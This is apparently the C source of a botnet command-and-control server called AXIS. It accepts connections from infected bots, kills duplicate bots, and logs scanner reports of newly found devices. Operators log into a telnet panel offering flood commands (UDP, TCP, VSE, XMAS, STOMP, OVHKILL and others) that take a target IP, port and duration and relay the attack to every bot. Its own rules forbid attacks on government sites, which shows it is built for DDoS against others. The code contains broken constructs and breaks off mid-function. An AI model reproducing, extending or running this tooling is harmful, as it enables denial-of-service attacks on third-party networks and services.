#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#define MAXFDS 1000000
//Made By @i_am_unbekannt.
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct AXIS_login {
	char username[100];
	char password[100];
};
static struct AXIS_login accounts[100];
static volatile FILE *telFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static volatile int OperatorsConnected = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "[ERROR] Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;//Made By @i_am_unbekannt.
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;//Made By @i_am_unbekannt.
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "! BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;//Made By @i_am_unbekannt.
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);//Made By @i_am_unbekannt.
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
					}
				}
			}
		}
	}
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\e[1;91m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("data.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}//Made By @i_am_unbekannt.

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char sentattacks[2048];
	memset(sentattacks, 0, 2048);
	char devicecount [2048];
	memset(devicecount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("data.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}

		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];
		char lin1 [5000];
		char lin2 [5000];
		char lin3 [5000];

		sprintf(lin1, "\e[0mWelcome to \e[1;91mAXIS\e[0m,\r\n");
		sprintf(lin2, "\e[0mEnter \e[1;91mCredentials\e[0m To Join\e[1;91m...\e[0m\r\n");
		sprintf(lin3, "\e[0m\r\n");
        sprintf(user, "\e[1;91mUsername\e[0m: \e[0m");

		if(send(datafd, lin1, strlen(lin1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lin2, strlen(lin2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lin3, strlen(lin3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);//Made By @i_am_unbekannt.
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
        sprintf(password, "\e[1;91mPassword\e[0m: \e[30m", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;

        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);//Made By @i_am_unbekannt.
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0;AXIS | Bots Online: %d | Users Online: %d | Current User: %s %c", '\033', BotsConnected(), OperatorsConnected, accounts[find_line].username, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}//Made By @i_am_unbekannt.
}			
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char AXIS_banner0   [5000];
		char AXIS_banner1   [5000];
        char AXIS_banner2   [5000];
        char AXIS_banner3   [5000];
        char AXIS_banner4   [5000];
        char AXIS_banner5   [5000];
        char AXIS_banner6   [5000];
        char AXIS_banner7   [5000];
        char AXIS_banner8   [5000];
        char AXIS_banner9   [5000];
        char AXIS_bannerI   [5000];

  		sprintf(AXIS_banner0,  "\033[2J\033[1;1H");
  		sprintf(AXIS_banner1,  "\e[0m\r\n");
  		sprintf(AXIS_banner2,  "\x1b[1;36m  · ▪\x1b[1;91m▄████████ ▀████\x1b[1;36m▪   ·\x1b[1;91m▐███▀ \x1b[1;36m·\x1b[1;91m▄█\x1b[1;36m  ·\x1b[1;91m▄████████\x1b[1;36m▪· \x1b[0m\r\n");
  		sprintf(AXIS_banner3,  "\x1b[1;36m ·  \x1b[1;91m███\x1b[1;36m   ·\x1b[1;91m███\x1b[1;36m · \x1b[1;91m███▌\x1b[1;36m  ·\x1b[1;91m▐███\x1b[1;36m ▪\x1b[1;91m ███\x1b[1;36m· \x1b[1;91m███\x1b[1;36m  · \x1b[1;91m███   \x1b[0m\r\n");
  		sprintf(AXIS_banner4,  "\x1b[1;36m   ·\x1b[1;91m███\x1b[1;36m·   \x1b[1;91m███▌\x1b[1;36m  ▪\x1b[1;91m███\x1b[1;36m·\x1b[1;91m  ███    ███▌\x1b[1;36m·\x1b[1;91m███\x1b[1;36m·   \x1b[1;91m█▀\x1b[1;36m·   \x1b[0m\r\n");
  		sprintf(AXIS_banner5,  "\x1b[1;36m  · \x1b[1;91m███\x1b[1;36m   ▪\x1b[1;91m███ \x1b[1;36m · \x1b[1;91m▀███▄███▀ \x1b[1;36m ·\x1b[1;91m ███▌ ███\x1b[1;36m ·   ·  ▪ \x1b[1;36m\r\n");
  		sprintf(AXIS_banner6,  "\x1b[1;91m  ▀███████████▌   \x1b[1;36m·\x1b[1;91m▄██▀██▄ \x1b[1;36m·\x1b[1;91m   ███▌▀██████████ \x1b[1;36m·\x1b[0m Type\x1b[1;91m HELP \x1b[0mfor Command List\e[1;91m!\x1b[0m\r\n");
  		sprintf(AXIS_banner7,  "\x1b[1;36m    \x1b[1;91m███▌\x1b[1;36m· \x1b[1;91m ███\x1b[1;36m·  \x1b[1;91m▐███\x1b[1;36m · \x1b[1;91m███▌\x1b[1;36m  ·\x1b[1;91m███\x1b[1;36m·  ·    ▪\x1b[1;91m██\x1b[1;36m·\x1b[0m   Coded by \x1b[1;91m@i_am_unbekannt\x1b[0m\r\n");
  		sprintf(AXIS_banner8,  "\x1b[1;36m   ▪\x1b[1;91m███ \x1b[1;36m  ·\x1b[1;91m███  ▄███\x1b[1;36m ▪  ·\x1b[1;91m███▄\x1b[1;36m· \x1b[1;91m███\x1b[1;36m ▪ \x1b[1;91m▄█\x1b[1;36m· · \x1b[1;91m███\x1b[1;36m ·\x1b[0m\r\n");
  		sprintf(AXIS_banner9,  "\x1b[1;36m   \x1b[1;91m▄███\x1b[1;36m·   \x1b[1;91m█▀ \x1b[1;36m·\x1b[1;91m▄███\x1b[1;36m·  ·   \x1b[1;91m███▄ █▀\x1b[1;36m· \x1b[1;91m▄████████▀\x1b[1;36m·\x1b[0m\r\n");
  		sprintf(AXIS_bannerI,  "\x1b[0m\r\n");

  		if(send(datafd, AXIS_banner0, strlen(AXIS_banner0), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner1, strlen(AXIS_banner1), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner2, strlen(AXIS_banner2), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner3, strlen(AXIS_banner3), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner4, strlen(AXIS_banner4), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner5, strlen(AXIS_banner5), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner6, strlen(AXIS_banner6), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner7, strlen(AXIS_banner7), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner8, strlen(AXIS_banner8), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_banner9, strlen(AXIS_banner9), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, AXIS_bannerI, strlen(AXIS_bannerI), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

			while(fdgets(buf, sizeof buf, datafd) > 0) {
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char help1  [800];
				char help2  [800];
				char help3  [800];
				char help4  [800];
				char help5  [800];
				char help6  [800];
				char help7  [800];
				char help8  [800];
//Made By @i_am_unbekannt.
        		sprintf(help1, "\e[1;91m╔═══════════════════════════════════════╗\e[0m\r\n");
        		sprintf(help2, "\e[1;91m║ ATTACK\e[0m - Shows Attack Commands.       \e[1;91m║\e[0m\r\n");
        		sprintf(help3, "\e[1;91m║ STATS\e[0m  - Shows Server Stats.          \e[1;91m║\e[0m\r\n");
        		sprintf(help4, "\e[1;91m║ RULES\e[0m  - Shows Rules.                 \e[1;91m║\e[0m\r\n");
        		sprintf(help5, "\e[1;91m║ INFO\e[0m   - Shows Info.                  \e[1;91m║\e[0m\r\n");
        		sprintf(help6, "\e[1;91m║ CLEAR\e[0m  - Clear Screen Back To Banner. \e[1;91m║\e[0m\r\n");
        		sprintf(help7, "\e[1;91m║ EXIT\e[0m   - Exits Out Of Server.         \e[1;91m║\e[0m\r\n");
        		sprintf(help8, "\e[1;91m╚═══════════════════════════════════════╝\e[0m\r\n");

				if(send(datafd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help3,  strlen(help3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help4,  strlen(help4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help5,  strlen(help5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help6,  strlen(help6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help7,  strlen(help7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help8,  strlen(help8), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}

				if(strstr(buf, "INFO")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char info1  [800];
				char info2  [800];
				char info3  [800];
				char info4  [800];
				char info5  [800];
				char info6  [800];

            	sprintf(info1, "\e[1;91m╔════════════════════════════════════════════════════╗\e[0m\r\n");
            	sprintf(info2, "\e[1;91m║  \e[0m     ! YOU SHOULD NOT SHARE THE SERVER IP !    \e[1;91m   ║\e[0m\r\n");
            	sprintf(info3, "\e[1;91m║  \e[0m           AXIS Botnet version 5.2.5           \e[1;91m   ║\e[0m\r\n");
            	sprintf(info4, "\e[1;91m║  \e[0mInstagram: https://instagram.com/i_am_unbekannt\e[1;91m   ║\e[0m\r\n");
            	sprintf(info5, "\e[1;91m║  \e[0mGithub: https://github.com/i-am-unbekannt/AXIS \e[1;91m   ║\e[0m\r\n");
            	sprintf(info6, "\e[1;91m╚════════════════════════════════════════════════════╝\e[0m\r\n");

				if(send(datafd, info1,  strlen(info1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info2,  strlen(info2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info3,  strlen(info3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info4,  strlen(info4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info5,  strlen(info5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info6,  strlen(info6), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);//Made By @i_am_unbekannt.
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "RULES")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char rules1  [800];
				char rules2  [800];
				char rules3  [800];
				char rules4  [800];
				char rules5  [800];
				char rules6  [800];
				char rules7  [800];

                sprintf(rules1, "\e[1;91m╔═══════════════════════════════════════════╗\e[0m\r\n");
                sprintf(rules2, "\e[1;91m║\e[0m 1. No Attacks Over 1200 Seconds.          \e[1;91m║\e[0m\r\n");
                sprintf(rules3, "\e[1;91m║\e[0m 2. No Spamming Attacks.                   \e[1;91m║\e[0m\r\n");
                sprintf(rules4, "\e[1;91m║\e[0m 3. No Attacks To Any Government Websites. \e[1;91m║\e[0m\r\n");
                sprintf(rules5, "\e[1;91m║\e[0m 4. No Sharing Logins.                     \e[1;91m║\e[0m\r\n");
                sprintf(rules6, "\e[1;91m║\e[0m 5. No Giving Out The Server IP.           \e[1;91m║\e[0m\r\n");
                sprintf(rules7, "\e[1;91m╚═══════════════════════════════════════════╝\e[0m\r\n");

				if(send(datafd, rules1,  strlen(rules1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, rules2,  strlen(rules2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, rules3,  strlen(rules3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, rules4,  strlen(rules4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, rules5,  strlen(rules5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, rules6,  strlen(rules6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, rules7,  strlen(rules7), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}//Made By @i_am_unbekannt.
				if(strstr(buf, "ATTACK")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char attack1  [800];
				char attack2  [800];
				char attack3  [800];
				char attack4  [800];
				char attack5  [800];
				char attack6  [800];
				char attack7  [800];
				char attack8  [800];
				char attack9  [800];
				char attacka  [800];
				char attackb  [800];
				char attackc  [800];
			  //char attackd  [800];
			  //Made By @i_am_unbekannt.
        		sprintf(attack1,  "\e[1;91m╔══════════════════════════════════════════════════════╗\e[0m\r\n");
        		sprintf(attack2,  "\e[1;91m║ \e[0m!\e[1;91m UDP     \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m 32 0 10                 ║\e[0m\r\n");
        		sprintf(attack3,  "\e[1;91m║ \e[0m!\e[1;91m TCP     \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m 32 \e[0m[\e[1;91mFLAGS\e[0m(\e[1;91mALL\e[0m)]\e[1;91m 0 10    ║\e[0m\r\n");
        		sprintf(attack4,  "\e[1;91m║ \e[0m!\e[1;91m STD     \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m                         ║\e[0m\r\n");
        		sprintf(attack5,  "\e[1;91m║ \e[0m!\e[1;91m STDHEX  \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m                         ║\e[0m\r\n");
        		sprintf(attack6,  "\e[1;91m║ \e[0m!\e[1;91m VSE     \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m 32 1024 10              ║\e[0m\r\n");
        		sprintf(attack7,  "\e[1;91m║ \e[0m!\e[1;91m XMAS    \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]    \e[0m[\e[1;91mFLAGS\e[0m(\e[1;91mALL\e[0m)]\e[1;91m 10 1024 ║\e[0m\r\n");
        		sprintf(attack8,  "\e[1;91m║ \e[0m!\e[1;91m STOMP   \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m] \e[1;91m32 \e[0m[\e[1;91mFLAGS\e[0m(\e[1;91mALL\e[0m)]\e[1;91m 10 1024 ║\e[0m\r\n");
        		sprintf(attack9,  "\e[1;91m║ \e[0m!\e[1;91m NFODROP \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m                         ║\e[0m\r\n");
        		sprintf(attacka,  "\e[1;91m║ \e[0m!\e[1;91m OVHKILL \e[0m[\e[1;91mIP\e[0m] [\e[1;91mPORT\e[0m] [\e[1;91mTIME\e[0m]\e[1;91m                         ║\e[0m\r\n");
        		sprintf(attackb,  "\e[1;91m║ \e[0m!\e[1;91m STOP                                               ║\e[0m\r\n");
        		sprintf(attackc,  "\e[1;91m╚══════════════════════════════════════════════════════╝\e[0m\r\n");
              /*sprintf(attackd,  "\e[1;91m\r\n");*/

				if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack2,  strlen(attack2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack3,  strlen(attack3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack4,  strlen(attack4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack5,  strlen(attack5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack6,  strlen(attack6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack7,  strlen(attack7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack8,  strlen(attack8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack9,  strlen(attack9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attacka,  strlen(attacka),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attackb,  strlen(attackb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attackc,  strlen(attackc),	MSG_NOSIGNAL) == -1) goto end;
				/*if(send(datafd, attackd,  strlen(attackd),	MSG_NOSIGNAL) == -1) goto end;*/

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

			if(strstr(buf, "STATS")) {
				char devicecount [2048];
				memset(devicecount, 0, 2048);
				char onlineusers [2048];//Made By @i_am_unbekannt.
				char userconnected [2048];

				sprintf(devicecount,   "\e[1;91m[ \e[0m➤ \e[1;91m] Bots Online\e[0m: \e[1;91m%d \e[0m\r\n", BotsConnected());		
				sprintf(onlineusers,   "\e[1;91m[ \e[0m➤ \e[1;91m] Users Online\e[0m: \e[1;91m%d \e[0m\r\n", OperatorsConnected);
				sprintf(userconnected, "\e[1;91m[ \e[0m➤ \e[1;91m] Current User\e[0m: \e[1;91m%s \e[0m\r\n", accounts[find_line].username);
				if(send(datafd, devicecount, strlen(devicecount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, onlineusers, strlen(onlineusers), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, userconnected, strlen(userconnected), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}

			if(strstr(buf, "CLEAR")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
  sprintf(clearscreen, "\033[2J\033[1;1H");
  if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner0, strlen(AXIS_banner0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner1, strlen(AXIS_banner1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner2, strlen(AXIS_banner2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner3, strlen(AXIS_banner3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner4, strlen(AXIS_banner4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner5, strlen(AXIS_banner5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner6, strlen(AXIS_banner6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner7, strlen(AXIS_banner7), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner8, strlen(AXIS_banner8), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_banner9, strlen(AXIS_banner9), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, AXIS_bannerI, strlen(AXIS_bannerI), MSG_NOSIGNAL) == -1) goto end;


				while(1) {
		char input [5000];//Made By @i_am_unbekannt.
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "EXIT")) {
				char exitmessage [2048];
				memset(exitmessage, 0, 2048);
				sprintf(exitmessage, "\e[0mExiting Out Of Server In 3 Seconds...\e[0m", accounts[find_line].username);
				if(send(datafd, exitmessage, strlen(exitmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(3);
				goto end;
			}

        if(strstr(buf, "! UDP")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mUDP\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! TCP")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mTCP\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! STD")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mSTD\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! VSE"))
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mVSE\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! XMAS")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mXMAS\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! CRUSH")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mCRUSH\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! STOMP")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mSTOMP\e[0m, Attack Has Been Sent.\e[0m\r\n");
